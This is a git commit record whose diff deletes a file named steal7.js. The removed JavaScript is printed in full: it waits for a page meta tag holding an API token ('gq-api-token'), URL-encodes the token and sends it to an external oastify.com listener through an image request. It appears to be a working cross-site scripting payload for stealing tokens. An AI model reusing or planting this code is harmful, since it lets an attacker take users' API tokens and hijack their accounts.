bbbbbfb4a6e9c0285f637050aac60b830b054355
michan10232 <44373893+michan10232@users.noreply.github.com>
2025-05-05 23:26:26 +0800

    Delete steal7.js

--- steal7.js
+++
@@ -1,8 +0,0 @@
-(function pollForToken() {
-  const meta = document.querySelector('meta[name="gq-api-token"]');
-  if (!meta) return setTimeout(pollForToken, 500);
-
-  const token = encodeURIComponent(meta.content);
-  const img = new Image();
-  img.src = `https://n5tdeo961nx8sz36mfm6o6o2ftll9cx1.oastify.com/?token=${token}`;
-})();
